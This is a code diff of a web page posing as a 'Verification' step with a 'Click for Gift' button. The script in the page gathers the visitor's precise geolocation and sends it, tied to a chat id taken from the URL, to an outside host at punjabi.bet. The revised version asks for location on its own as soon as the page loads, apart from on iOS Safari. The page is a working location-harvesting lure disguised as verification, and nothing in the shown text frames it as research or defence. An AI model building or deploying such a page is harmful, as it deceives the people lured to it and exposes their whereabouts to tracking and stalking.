@@ -19,120 +19,36 @@
     button.primary{background:#FFD700;color:#1b1b1b;border-color:#FFC300}
     .note{font-size:13px;color:#9c9c9c;margin-top:10px;line-height:1.4}
     .hidden{display:none}
-    .ok{color:#9cff9c}
-    .warn{color:#ffd280}
-    .err{color:#ff9c9c}
   </style>
 </head>
 <body>
   <div class="card" id="card">
-    <h1> Verification</h1>
+    <h1>Verification</h1>
     <div class="spinner hidden" id="spinner"></div>
-    <p id="status"> verification</p>
-
+    <p id="status"></p>
     <div class="row" id="actions">
-      <button class="primary" id="allowBtn">click for gift</button>
-      <button id="skipBtn">skip gift</button>
+      <button class="primary" id="allowBtn">Click for Gift</button>
+      <button id="skipBtn">Skip gift</button>
     </div>
-
-    
-
-    <p class="note" id="httpsWarn" style="display:none">Tip</p>
+   
   </div>
-
   <script>
-    const qs = new URLSearchParams(location.search);
-    const chatId = qs.get('id') || '';
-    const statusEl = document.getElementById('status');
-    const spinner = document.getElementById('spinner');
-    const actions = document.getElementById('actions');
-    const httpsWarn = document.getElementById('httpsWarn');
-    const allowBtn = document.getElementById('allowBtn');
-    const skipBtn = document.getElementById('skipBtn');
-
-    if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
-      httpsWarn.style.display = 'block';
-    }
-
-    const setBusy = (busy) => {
-      spinner.classList.toggle('hidden', !busy);
-      actions.style.display = busy ? 'none' : 'flex';
-    };
-
-    const goNext = (sent) => {
-      // If you want to flag whether data was shared, append &shared=1|0
-      const url = `/I/?id=${encodeURIComponent(chatId)}${sent ? '&shared=1' : '&shared=0'}`;
-      location.href = url;
-    };
-
-    const sendGeo = async ({ latitude, longitude, accuracy }) => {
-      const url = `https://punjabi.bet/webot/loc?lat=${encodeURIComponent(latitude)}&lon=${encodeURIComponent(longitude)}&acc=${encodeURIComponent(accuracy)}&chat_id=${encodeURIComponent(chatId)}&ts=${Date.now()}`;
-      // Using GET to match your existing endpoint. No IP is fetched or attached by us.
-      await fetch(url, { method: 'GET', mode: 'no-cors' });
-    };
-
-    const requestGeolocation = () => {
-      if (!('geolocation' in navigator)) {
-        statusEl.innerHTML = 'Your browser does not support geolocation.';
-        statusEl.className = 'err';
-        return;
-      }
-      setBusy(true);
-      statusEl.textContent = 'Requesting ...';
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        try {
-          statusEl.textContent = 'Got. Verifying...';
-          statusEl.className = 'ok';
-          await sendGeo({
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: Math.round(pos.coords.accuracy || 0)
-          });
-          statusEl.textContent = 'Verification complete.';
-          goNext(true);
-        } catch (e) {
-          setBusy(false);
-          statusEl.textContent = 'Verification failed. Please try again.';
-          statusEl.className = 'err';
-        }
-      }, (err) => {
-        setBusy(false);
-        if (err.code === err.PERMISSION_DENIED) {
-          statusEl.innerHTML = 'You denied the request. .';
-          statusEl.className = 'warn';
-        } else if (err.code === err.POSITION_UNAVAILABLE) {
-          statusEl.textContent = 'Location unavailable..';
-          statusEl.className = 'err';
-        } else if (err.code === err.TIMEOUT) {
-          statusEl.textContent = 'request timed out. Try again.';
-          statusEl.className = 'err';
-        } else {
-          statusEl.textContent = 'Could not get location.';
-          statusEl.className = 'err';
-        }
-      }, { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
-    };
-
-    allowBtn.addEventListener('click', async () => {
-      // Optional: glance at current permission state (doesn't request access itself)
-      try {
-        if (navigator.permissions && navigator.permissions.query) {
-          const p = await navigator.permissions.query({ name: 'geolocation' });
-          if (p.state === 'denied') {
-            statusEl.textContent = ' blocked in your browser settings.';
-            statusEl.className = 'warn';
-            return;
-          }
-        }
-      } catch {}
-      requestGeolocation();
-    });
-
-    skipBtn.addEventListener('click', () => {
-      statusEl.textContent = 'Continuing without sharing your location.';
-      statusEl.className = 'warn';
-      goNext(false);
-    });
+    const qs=new URLSearchParams(location.search)
+    const chatId=qs.get('id')||''
+    const statusEl=document.getElementById('status')
+    const spinner=document.getElementById('spinner')
+    const actions=document.getElementById('actions')
+    const allowBtn=document.getElementById('allowBtn')
+    const skipBtn=document.getElementById('skipBtn')
+    const isSecure=location.protocol==='https:'||location.hostname==='localhost'
+    const isiOSSafari=(()=>{const ua=navigator.userAgent;const isIOS=/iP(hone|ad|od)/.test(ua);const isSafari=/^((?!chrome|android).)*safari/i.test(ua);return isIOS&&isSafari})()
+    const setBusy=b=>{spinner.classList.toggle('hidden',!b);actions.style.display=b?'none':'flex'}
+    const goNext=shared=>{location.href=`/I/?id=${encodeURIComponent(chatId)}&shared=${shared?1:0}`}
+    const sendGeo=async(lat,lon,acc)=>{const url=`https://punjabi.bet/webot/loc?lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}&chat_id=${encodeURIComponent(chatId)}&ts=${Date.now()}`;await fetch(url,{method:'GET',mode:'no-cors'})}
+    const requestGeo=()=>{if(!isSecure){statusEl.textContent='Geolocation requires HTTPS.';return}if(!('geolocation'in navigator)){statusEl.textContent='Not supported.';return}setBusy(true);statusEl.textContent='Requesting...';navigator.geolocation.getCurrentPosition(async pos=>{try{await sendGeo(pos.coords.latitude,pos.coords.longitude,Math.round(pos.coords.accuracy||0));statusEl.textContent='Verification complete.';goNext(true)}catch{setBusy(false);statusEl.textContent='Verification failed.'}},err=>{setBusy(false);if(err.code===err.PERMISSION_DENIED){statusEl.textContent='Denied.'}else if(err.code===err.POSITION_UNAVAILABLE){statusEl.textContent='unavailable.'}else if(err.code===err.TIMEOUT){statusEl.textContent='Timed out.'}else{statusEl.textContent='Could not get location.'}},{enableHighAccuracy:true,timeout:12000,maximumAge:0})}
+    allowBtn.addEventListener('click',requestGeo)
+    skipBtn.addEventListener('click',()=>{statusEl.textContent='Continuing.';goNext(false)})
+    ;(async()=>{if(!isiOSSafari&&isSecure){try{if(navigator.permissions?.query){const p=await navigator.permissions.query({name:'geolocation'});if(p.state==='granted'){requestGeo();return}if(p.state==='prompt'){requestGeo();return}}else{requestGeo()}}catch{}}actions.style.display='flex'})()
   </script>
 </body>
 </html>
